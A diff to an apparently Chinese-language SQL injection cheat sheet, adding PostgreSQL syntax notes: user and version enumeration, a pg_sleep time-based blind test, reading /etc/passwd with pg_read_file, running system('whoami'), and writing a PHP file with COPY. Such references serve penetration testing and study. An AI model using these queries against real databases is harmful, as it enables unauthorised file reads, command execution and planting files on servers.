@@ -28,7 +28,26 @@ and (select+ascii(substr(column_name,1,1)) information_schema.columns where tabl
 
 ### 四、时间盲注
 
-### 五、PostgreSQL语法注意
+### 五、PostgreSQL语法
+#### 常用语法
+select CURRENT_SCHEMA()           #查看当前权限
+select user                       #查看用户
+select current_user               #查看当前用户
+select chr(97)                    #将ASCII码转为字符
+select chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  #将ASCII转换为字符串
+SELECT session_user;
+SELECT usename FROM pg_user;
+SELECT getpgusername();
+select version()                  #查看PostgreSQL数据库版本
+SELECT current_database()         #查看当前数据库
+select length('admin')            #查看长度
+select case when(expr1) then result1 else result2 end;  #如果xx，执行result1，否则result2
+例：select case when(current_user='postgres') then pg_sleep(5) else pg_sleep(0) end;
+select pg_read_file('/etc/passwd');          #读取文件
+select system('whoami');                     #执行系统命令,11.2以下才有该命令
+COPY (select '<?php phpinfo();?>') to '/tmp/1.php';   #写入文件
+
+#### 注意点
 此数据库有一个特性，使用like查询子句时，比如：
 ```SQL
 where aaa like '%aaa%';
